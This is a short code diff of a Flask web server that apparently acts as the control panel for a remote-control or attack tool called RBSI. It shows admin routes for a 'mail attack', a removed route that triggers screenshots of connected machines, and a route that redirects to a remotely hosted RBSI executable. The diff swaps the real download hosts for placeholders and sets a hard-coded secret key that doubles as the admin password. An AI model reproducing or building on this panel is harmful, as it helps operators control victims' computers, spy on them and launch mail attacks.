@@ -3,12 +3,12 @@ import json
 import os
 import time
 
-version = 5
-download_address = "http://rbsi.yxzl.top:5001/static/RBSI-5.exe"
+version = 1
+download_address = "http://YOUR_SERVER_HOST:YOUR_SERVER_PORT/static/RBSI.exe"
 
 thisDir = os.path.dirname(os.path.abspath(__file__))
 app = Flask(__name__)
-app.secret_key = "-RBSI-"
+app.secret_key = "RBSI"
 password = app.secret_key
 connects = {}
 not_connect = {}
@@ -172,15 +172,6 @@ def sub_mail_attack():
     return redirect("/")
 
 
-@app.route("/screenshot", methods=["POST"])
-def sub_screenshot():
-    if not session.get("admin"):
-        return redirect("/")
-    global screenshot
-    screenshot = time.time()
-    return redirect("/")
-
-
 @app.route("/stop-once", methods=["GET", "POST"])
 def sub_stop_once():
     if not session.get("admin"):
@@ -220,19 +211,9 @@ def sub_show_version():
     return redirect("/")
 
 
-@app.route("/check-network", methods=["GET", "POST"])
-def check_network():
-    return "Success"
-
-
 @app.route("/d")
 def get_download():
     return redirect(download_address)
-
-
-@app.route("/download")
-def get_download_address():
-    return "https://free-cn-01.host.bilnn.com/get/yxzlimage/RBSI-5.exe"
 
 
 if __name__ == "__main__":
